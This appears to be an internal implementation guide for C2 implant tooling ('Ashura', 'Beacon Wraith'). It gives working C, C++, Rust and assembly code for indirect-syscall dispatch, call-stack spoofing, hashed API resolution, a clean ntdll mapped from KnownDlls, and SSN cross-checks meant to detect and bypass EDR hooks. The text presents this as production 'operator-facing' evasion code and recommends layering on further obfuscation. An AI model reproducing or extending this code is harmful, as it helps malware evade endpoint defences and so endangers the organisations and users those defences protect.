# Implementation Examples — Indirect Syscall Patterns (C + Rust)

Practical design patterns distilled from Ashura and Beacon Wraith implementations. Use this file when implementing production-grade syscall dispatchers with explicit mode switching and robust arg handling.

## Table of Contents

1. Why these examples matter
2. C pattern (Ashura-style)
3. C++ pattern (Beacon Wraith C-style)
4. Rust pattern (Ashura/Wraith RS-style)
5. Integration checklist

---

## 1) Why these examples matter

These codebases demonstrate patterns often missing in PoCs:

- explicit resolver/dispatch modes
- stable wrappers for 4/6/11-arg syscalls
- optional composition with stack spoofing
- fallback behavior when spoof context is unavailable

This is the difference between a lab demo and maintainable operator-facing code.

---

## 2) C pattern (Ashura-style)

### Mode-switch + unified wrapper strategy

Key idea: keep one Nt* wrapper API and switch dispatch path internally.

Representative shape:

```c
#ifndef ASH_SYSCALL_MODE
#define ASH_SYSCALL_MODE 1
#endif

static NTSTATUS ash_nt_allocate_virtual_memory(HANDLE process, PVOID *base_addr,
    SIZE_T zero_bits, PSIZE_T region_size, ULONG alloc_type, ULONG protect)
{
#if ASH_SYSCALL_MODE == 2
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID *, SIZE_T, PSIZE_T, ULONG, ULONG);
    fn_t fn = (fn_t)ASH_CLEAN_NT(H_NTALLOCATEVIRTUALMEMORY);
    if (!fn) return (NTSTATUS)0xC0000001L;
    return fn(process, base_addr, zero_bits, region_size, alloc_type, protect);
#else
    ASH_ISYSCALL_INIT();
    unsigned short ssn = ash_ssn(H_NTALLOCATEVIRTUALMEMORY);
    if (!ssn) return (NTSTATUS)0xC0000001L;
    return ash_isyscall6(ssn,
        (ULONG_PTR)process, (ULONG_PTR)base_addr,
        (ULONG_PTR)zero_bits, (ULONG_PTR)region_size,
        (ULONG_PTR)alloc_type, (ULONG_PTR)protect);
#endif
}
```

Why it works:

- wrappers remain stable while strategy evolves
- easy A/B testing between indirect and clean-fnptr modes
- reduced regression risk when adding APIs

---

## 3) C++ pattern (Beacon Wraith C-style)

### Interface-driven gate abstraction

Expose a generic gate interface and keep syscall engine behind it.

```cpp
class IEvasionGate {
public:
    virtual BOOL Init() = 0;
    virtual uint32_t Syscall(uint16_t num, uintptr_t* args, int argCount) = 0;
    virtual uintptr_t ResolveFn(const char* module, const char* function) = 0;
    virtual uintptr_t Call(uintptr_t fn, uintptr_t* args, int argCount) = 0;
    virtual void Close() = 0;
};
```

Implementation pattern:

- phase 1: build SSN table (sorted `Zw*` exports)
- phase 2: find valid `syscall;ret` gate(s)
- phase 3+: optional spoof/sleep features layered on top

Operational gain:

- you can swap gate implementations without touching agent business logic
- easier testing of fallback paths (`argCount > 6`, missing spoof gadgets, etc.)

---

## 4) Rust pattern (Ashura/Wraith RS-style)

### Dispatch by hash + arg-count wrappers

Keep helper trio:

- `dispatch4(fn_hash, ...)`
- `dispatch6(fn_hash, ...)`
- `dispatch11(fn_hash, ...)`

Representative mode-aware dispatch:

```rust
#[inline(always)]
pub unsafe fn dispatch4(fn_hash: u32, a1: u64, a2: u64, a3: u64, a4: u64) -> NTSTATUS {
    let (ssn, fnptr) = resolve_ssn_and_fn(fn_hash);

    if SYSCALL_MODE == 2 && fnptr != 0 {
        type Fn4 = unsafe extern "system" fn(u64, u64, u64, u64) -> NTSTATUS;
        let f: Fn4 = core::mem::transmute(fnptr);
        return f(a1, a2, a3, a4);
    }

    if ssn == 0 { return -1; }
    indirect_syscall4(ssn, a1, a2, a3, a4)
}
```

### Optional spoof composition

```rust
if CALL_STACK_SPOOF && smw_is_ready() {
    return smw_spoofed_syscall6(ssn, a1, a2, a3, a4, a5, a6);
}
indirect_syscall6(ssn, a1, a2, a3, a4, a5, a6)
```

Design benefit:

- resolver and spoofing remain independently testable
- 4/6/11-arg paths are explicit and easier to fuzz

---

## 5) Three-way SSN consensus (Ashura production pattern)

Naive RecycledGate trusts the sorted-export index as the SSN. In practice, Windows export-order gaps or EDR tampering can make a raw sorted-index unreliable. The hardened pattern validates each SSN through three independent sources:

```rust
fn validated_ssn_tuple(sorted_index: Option<u16>, nt_stub: Option<u16>, zw_stub: Option<u16>) -> Option<u16> {
    let cached = sorted_index?;
    match (nt_stub, zw_stub) {
        (Some(nt), Some(zw)) if nt == zw && nt == cached => Some(nt),
        _ => None,  // disagreement → fail closed
    }
}
```

The three sources:
- **Sorted export index**: position in VA-sorted Zw* list (RecycledGate)
- **Nt* stub read**: Hell's Gate extraction from the Nt-prefixed export
- **Zw* stub read**: Hell's Gate extraction from the Zw-prefixed alias

All three must agree. A disagreement means either the stubs are hooked (EDR changed bytes) or the export ordering is atypical (rare Windows build artifact). Either way, the function is excluded from the dispatcher and callers fail closed.

**Advantage**: catches corrupted stubs that would pass RecycledGate alone, because RecycledGate never reads stub bytes. Also catches stub-read errors that would pass Hell's Gate alone, because Hell's Gate does not verify against export ordering.

**Cost**: two extra 8-byte reads per validated function at init. Zero per-dispatch overhead (results are cached).

---

## 6) Shadow ntdll / KnownDlls resolver (concrete pattern)

When in-memory ntdll cannot be trusted (aggressive hooks, in-memory patching), map a clean copy from `\KnownDlls\ntdll.dll`:

```rust
// Bootstrap: resolve NtOpenSection + NtMapViewOfSection from the in-process
// ntdll (the only two calls against the real base).
let open_section: NtOpenSectionFn = resolve(ntdll, HASH_NTOPENSECTION);
let map_view: NtMapViewOfSectionFn = resolve(ntdll, HASH_NTMAPVIEWOFSECTION);

// Open the KnownDlls section object (read + execute only)
let mut section_handle = INVALID_HANDLE;
let name = unicode_string("\\KnownDlls\\ntdll.dll");
let mut oa = OBJECT_ATTRIBUTES { ObjectName: &name, .. };
open_section(&mut section_handle, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa);

// Map a pristine RX view
let mut view_base: PVOID = null_mut();
let mut view_size: SIZE_T = 0;
map_view(section_handle, current_process(), &mut view_base, ..., PAGE_EXECUTE_READ);

// Close the handle (the view holds its own reference)
close(section_handle);

// Use view_base as the resolution base for all SSN reads and gadget discovery
```

**Key contracts**:
- The shadow view is `PAGE_EXECUTE_READ` — never written.
- The `syscall;ret` gadget comes from the **same** base as the SSN reads. Mixing bases (shadow SSNs + real-ntdll gadget) produces correct SSNs but the gadget points into hooked memory.
- Any mapping failure falls back to in-process resolution (never crashes).
- The two bootstrap calls (NtOpenSection, NtMapViewOfSection) are the only calls against the potentially hooked in-process ntdll.

---

## 7) 14-argument trampoline (Ashura .s pattern)

The existing 4/6/11-arg trampolines cover most NT APIs, but some paths need more (e.g. compound operations or custom wrappers). The 14-arg variant extends the shift-down pattern:

```asm
.globl indirect_syscall14
indirect_syscall14:
    push r15
    push r14
    push r13
    push r12
    ; rsp = A-0x20; user args 3..14 at [rsp+0x48..0xA0]
    mov r11, rdx           ; gadget
    mov r12, [rsp+0x48]    ; arg3
    mov r13, [rsp+0x50]    ; arg4
    ; Shift args 5..14 down two slots for the kernel ABI
    mov r14, [rsp+0x58]
    mov r15, [rsp+0x60]
    mov [rsp+0x48], r14
    mov [rsp+0x50], r15
    mov r14, [rsp+0x68]
    mov r15, [rsp+0x70]
    mov [rsp+0x58], r14
    mov [rsp+0x60], r15
    mov r14, [rsp+0x78]
    mov r15, [rsp+0x80]
    mov [rsp+0x68], r14
    mov [rsp+0x70], r15
    mov r14, [rsp+0x88]
    mov r15, [rsp+0x90]
    mov [rsp+0x78], r14
    mov [rsp+0x80], r15
    mov r14, [rsp+0x98]
    mov r15, [rsp+0xA0]
    mov [rsp+0x88], r14
    mov [rsp+0x90], r15
    mov eax, ecx           ; SSN
    mov rcx, r8            ; arg1
    mov r10, rcx           ; kernel reads r10
    mov rdx, r9            ; arg2
    mov r8, r12            ; arg3
    mov r9, r13            ; arg4
    pop r12
    pop r13
    pop r14
    pop r15
    jmp r11                ; indirect through gadget
```

The pattern is mechanical: each pair of stack args is loaded into r14/r15, written two slots lower, then the next pair follows. The shift-by-two compensates for `ssn` and `gadget` occupying the first two Win64 parameter slots.

---

## 8) Integration checklist

Before merging a new dispatcher:

1. Validate `dispatch4/6/11/14` against known-good NTSTATUS panel.
2. Validate mode switching does not change wrapper signatures.
3. Verify gate bytes (`0F 05 C3`) before caching.
4. Confirm fallback behavior when spoof context is missing.
5. Validate three-way SSN consensus (sorted index vs Nt stub vs Zw stub).
6. Stress-test with ASLR-enabled repeated runs.

If any check fails, fix architecture first, then add obfuscation/evasion extras.
